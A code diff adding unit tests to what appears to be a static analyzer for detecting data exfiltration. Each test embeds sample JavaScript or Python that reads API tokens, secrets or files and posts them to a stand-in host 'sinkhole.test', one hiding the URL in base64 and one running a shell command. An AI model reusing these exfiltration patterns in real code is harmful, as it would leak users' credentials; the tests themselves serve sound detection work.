@@ -279,6 +279,90 @@ class TestStaticAnalyzer:
             for finding in report.findings
         )
 
+    def test_typescript_alias_sinks_and_sources_detected(self):
+        """Common JS/TS sink aliases should map back to their canonical capability."""
+        code = (
+            "const client = require('axios')\n"
+            "const fs = require('fs')\n"
+            "const http = require('http')\n"
+            "const { execSync: run } = require('child_process')\n"
+            "const token = process.env.API_TOKEN\n"
+            "const data = fs.readFileSync('secret.txt', 'utf8')\n"
+            "fs.writeFileSync('out.txt', data)\n"
+            "run('whoami')\n"
+            "client.post('https://sinkhole.test/collect', { token, data })\n"
+            "http.request({ host: 'sinkhole.test', path: '/collect', method: 'POST' })\n"
+        )
+        evidence = analyze_source("ts_aliases", code)
+        sink_objects = {e.object for e in evidence if e.predicate == "sink_identified"}
+        source_objects = {e.object for e in evidence if e.predicate == "source_identified"}
+        assert {"network_send", "file_write", "shell_exec"} <= sink_objects
+        assert {"env_var", "file_read"} <= source_objects
+
+    def test_typescript_crypto_patterns_detected(self):
+        """Node crypto imports and cipher construction should flag credential handling."""
+        code = (
+            "const crypto = require('crypto')\n"
+            "const { createCipheriv } = require('crypto')\n"
+            "const secret = process.env.API_SECRET\n"
+            "crypto.createCipher('aes-256-cbc', secret)\n"
+            "createCipheriv('aes-256-cbc', secret, Buffer.alloc(16))\n"
+        )
+        evidence = analyze_source("ts_crypto", code)
+        assert any(
+            e.predicate == "has_data_label" and e.object == "credential"
+            for e in evidence
+        )
+        assert any(
+            e.predicate == "inferred_capability" and e.object == "credential_access"
+            for e in evidence
+        )
+
+    def test_python_from_import_alias_and_sink_shadowing_detected(self):
+        """Aliased imports and sink shadowing should still produce a source-sink path."""
+        code = (
+            "from os import getenv\n"
+            "from requests import post as send_data\n"
+            "token = getenv('API_TOKEN')\n"
+            "payload = {'token': token.strip()}\n"
+            "domain = 'sinkhole.test'\n"
+            "url = 'https://' + domain + '/collect'\n"
+            "sender = send_data\n"
+            "sender(url, json=payload)\n"
+        )
+        evidence = analyze_source("py_shadow", code)
+        assert any(
+            e.predicate == "source_sink_path" and e.object == "env_var->network_send"
+            for e in evidence
+        )
+        assert any(e.predicate == "flows_to" for e in evidence)
+
+    def test_python_obfuscated_session_send_detected(self):
+        """Session.send fed by a prepared request should survive obfuscated URL assembly."""
+        code = (
+            "import base64\n"
+            "from os import getenv\n"
+            "from requests import Request\n"
+            "from requests.sessions import Session\n"
+            "secret = getenv('API_SECRET')\n"
+            "url = base64.b64decode('aHR0cHM6Ly9zaW5raG9sZS50ZXN0L2NvbGxlY3Q=').decode()\n"
+            "payload = secret.encode().decode()\n"
+            "session = Session()\n"
+            "sender = session.send\n"
+            "req = Request('POST', url, data=payload).prepare()\n"
+            "sender(req)\n"
+        )
+        evidence = analyze_source("py_obfuscated_send", code)
+        assert any(
+            e.predicate == "source_sink_path" and e.object == "env_var->network_send"
+            for e in evidence
+        )
+        assert any(e.predicate == "flows_to" for e in evidence)
+        assert any(
+            e.predicate == "obfuscation_detected"
+            for e in evidence
+        )
+
 
 # ===================================================================
 # Sandbox prober tests
